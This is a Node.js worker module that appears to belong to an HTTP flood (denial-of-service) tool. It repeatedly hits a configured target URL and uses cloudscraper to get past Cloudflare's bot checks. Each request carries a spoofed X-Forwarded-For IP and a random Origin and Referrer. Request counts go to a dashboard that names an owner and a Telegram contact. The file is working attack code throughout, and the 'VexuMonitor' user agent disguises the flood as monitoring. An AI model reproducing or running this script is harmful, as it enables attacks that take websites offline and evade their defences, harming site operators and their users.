const cloudscraper = require('cloudscraper');
const request = require('request');
const randomstring = require('randomstring');
const config = require('./config.json');

let state = {
    running: false,
    url: config.targetUrl,
    startedAt: null,
    requestsSent: 0,
    errors: 0,
    restarts: 0,
    lastRestartAt: null,
    cycleDuration: config.cycleDurationSeconds
};

let loopTimer = null;
let restartTimer = null;
let ioRef = null;

function randomByte() {
    return Math.round(Math.random() * 256);
}

function broadcast() {
    if (ioRef) ioRef.emit('status', getStatus());
}

function oneCycle() {
    if (!state.running) return;

    const url = state.url;
    let cookie = 'ASDFGHJKLZXCVBNMQWERTYUIOPasdfghjklzxcvbnmqwertyuiop1234567890';
    let useragent = 'Mozilla/5.0 (VexuMonitor)';

    cloudscraper.get(url, function (error, response) {
        if (!state.running) return;

        if (error) {
            state.errors++;
        } else {
            try {
                const parsed = JSON.parse(JSON.stringify(response));
                cookie = parsed["request"]["headers"]["cookie"] || cookie;
                useragent = parsed["request"]["headers"]["User-Agent"] || useragent;
            } catch (e) {}
        }

        const rand = randomstring.generate({
            length: 10,
            charset: 'abcdefghijklmnopqstuvwxyz0123456789'
        });

        const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;

        const options = {
            url: url,
            headers: {
                'User-Agent': useragent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '2000',
                'cookie': cookie,
                'Origin': 'http://' + rand + '.com',
                'Referrer': 'http://google.com/' + rand,
                'X-Forwarded-For': ip
            }
        };

        request(options, function (err) {
            if (err) state.errors++;
            else state.requestsSent++;
            broadcast();
        });
    });
}

function scheduleRestart() {
    restartTimer = setTimeout(() => {
        if (!state.running) return;
        state.restarts++;
        state.lastRestartAt = Date.now();
        state.startedAt = Date.now();
        state.requestsSent = 0;
        state.errors = 0;
        broadcast();
        scheduleRestart();
    }, state.cycleDuration * 1000);
}

function startWorker(io) {
    ioRef = io;
    state.running = true;
    state.startedAt = Date.now();
    state.requestsSent = 0;
    state.errors = 0;
    state.restarts = 0;
    state.lastRestartAt = null;
    broadcast();

    loopTimer = setInterval(oneCycle, config.requestIntervalMs);
    scheduleRestart();
}

function getStatus() {
    const now = Date.now();
    const uptimeSec = state.startedAt ? Math.floor((now - state.startedAt) / 1000) : 0;
    return {
        running: state.running,
        url: state.url,
        uptimeSec,
        cycleDuration: state.cycleDuration,
        requestsSent: state.requestsSent,
        errors: state.errors,
        restarts: state.restarts,
        lastRestartAt: state.lastRestartAt,
        startedAt: state.startedAt,
        owner: 'Entity Vexu',
        contact: '@UsAdminChat_bot'
    };
}

module.exports = { startWorker, getStatus };
